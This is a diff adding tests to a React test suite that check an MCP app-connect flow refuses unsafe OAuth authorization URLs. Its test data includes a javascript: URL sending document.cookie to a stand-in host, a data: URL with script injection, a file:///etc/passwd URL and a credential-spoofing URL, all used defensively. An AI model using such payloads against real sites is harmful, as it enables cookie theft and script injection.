@@ -1259,6 +1259,79 @@ describe("AppsConnect — guided generic MCP flow (PAP-17087)", () => {
     await flushReact();
 
     expect(navigateTopLevelMock).toHaveBeenCalledWith("https://auth.example.test/authorize?state=abc");
+    // Residual risk of a real-but-hostile authorization page: name the host the
+    // operator is being handed to (PAP-17099).
+    expect(container.textContent).toContain("auth.example.test");
+  });
+
+  /**
+   * PAP-17099 — a generic MCP server picks its own authorization endpoint, and
+   * `window.location.assign` is where an unsafe scheme would actually execute.
+   * The board refuses independently of the API response.
+   */
+  describe("unsafe authorization urls", () => {
+    const UNSAFE = [
+      ["javascript:", "javascript:fetch('https://evil.test/'+document.cookie)"],
+      ["data:", "data:text/html,<script>alert(document.domain)</script>"],
+      ["file:", "file:///etc/passwd"],
+      ["plaintext http", "http://evil.test/authorize"],
+      ["credentials", "https://auth.example.test@evil.test/authorize"],
+    ] as const;
+
+    it.each(UNSAFE)("never opens a %s start url from connect", async (_label, startUrl) => {
+      connectAppMock.mockResolvedValue({
+        connectionId: "conn-1",
+        application: { id: "app-1", name: "mcp.example.test" },
+        actions: { readOnly: [], canMakeChanges: [] },
+        catalog: [],
+        suggestedDefaults: {},
+        auth: { kind: "oauth", startUrl },
+      });
+      await render();
+      await gotoLinkFrame(container, "https://mcp.example.test/mcp");
+      await act(async () => {
+        buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
+      });
+      await flushReact();
+      await flushReact();
+
+      expect(navigateTopLevelMock).not.toHaveBeenCalled();
+      expect(container.textContent).toContain("couldn’t connect");
+      // The refusal is explained without echoing the hostile address on screen.
+      expect(container.textContent).not.toContain(startUrl);
+      expect(container.textContent).toMatch(/sign-in address/);
+    });
+
+    it.each(UNSAFE)("never opens a %s authorization url from start sign-in", async (_label, authorizationUrl) => {
+      connectAppMock.mockResolvedValue({
+        connectionId: "conn-1",
+        application: { id: "app-1", name: "mcp.example.test" },
+        actions: { readOnly: [], canMakeChanges: [] },
+        catalog: [],
+        suggestedDefaults: {},
+        auth: { kind: "oauth", startUrl: null },
+      });
+      startOAuthMock.mockResolvedValue({
+        connectionId: "conn-1",
+        provider: "mcp_example_test",
+        authorizationUrl,
+        expiresAt: "2099-01-01T00:00:00.000Z",
+      });
+      await render();
+      await gotoLinkFrame(container, "https://mcp.example.test/mcp");
+      await act(async () => {
+        buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
+      });
+      await flushReact();
+      await flushReact();
+
+      expect(startOAuthMock).toHaveBeenCalledWith("conn-1");
+      expect(navigateTopLevelMock).not.toHaveBeenCalled();
+      expect(container.textContent).toContain("couldn’t connect");
+      expect(container.textContent).not.toContain(authorizationUrl);
+      // Retry is still offered rather than a dead end.
+      expect(buttonByText("Try again")).toBeTruthy();
+    });
   });
 
   it("asks for a preregistered client rather than losing the draft", async () => {
